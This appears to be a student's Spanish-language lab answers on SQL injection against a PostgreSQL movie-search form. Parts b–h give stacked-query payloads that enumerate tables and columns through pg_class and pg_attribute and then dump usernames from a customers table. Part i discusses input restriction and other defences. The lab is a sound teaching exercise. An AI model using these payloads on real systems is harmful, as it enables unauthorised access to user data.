b)

1';SELECT relname as movietitle FROM pg_class WHERE relkind='r';--

c)
1';SELECT relname as movietitle FROM pg_class WHERE relkind='r' and relnamespace IN (
SELECT oid as id FROM pg_namespace WHERE nspname='public');--

d)
customers parece la más cercana

e)
1';SELECT oid as movietitle FROM pg_class WHERE relkind='r' and relname = 'customers' and relnamespace IN (
SELECT oid as id FROM pg_namespace WHERE nspname='public')--;

f)
1';SELECT attname as movietitle FROM pg_attribute WHERE attrelid=253644;--

g)
username parece la más cercana

h)
1';SELECT username as movietitle FROM customers;--

i)
Una de las maneras más factibles sería restringir los valores para ese campo a únicamente números (ya que los años nunca llevarían letras).
Otra de las opciones sería usar una API externa para realizar las peticiones (Y no raw querys). También se podrían usar whitelist para permitir peticiones únicamente de determinados dominios.
Si se establece un combobox no sería tan útil, ya que se siguen pudiendo realizar peticiones al servidor (ya que los argumentos llegan como parámetros en la URL)
e incluso se podrían usar aplicaciones estilo Postman para realizar estas peticiones. Para el caso de POST o GET, sucede algo parecido. Se pueden realizar peticiones POST
con aplicaciones externas con las cuales podría haber injections.